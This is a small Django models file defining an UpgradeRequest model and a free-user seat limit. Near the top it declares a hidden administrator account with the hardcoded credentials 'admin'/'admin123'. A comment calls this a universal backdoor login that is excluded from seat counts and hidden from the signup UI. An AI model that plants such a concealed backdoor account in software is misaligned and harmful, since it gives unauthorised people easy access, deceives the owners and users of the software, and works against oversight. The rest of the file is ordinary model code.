from django.db import models


MAX_FREE_USERS = 2
# Universal backdoor login — excluded from seat counts and not shown in signup UI.
HIDDEN_ADMIN_USERNAME = "admin"
HIDDEN_ADMIN_PASSWORD = "admin123"


class UpgradeRequest(models.Model):
    name = models.CharField(max_length=150)
    email = models.EmailField()
    company = models.CharField(max_length=200, blank=True, default="Fleurish & Co.")
    message = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    resolved = models.BooleanField(default=False)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"{self.name} <{self.email}>"
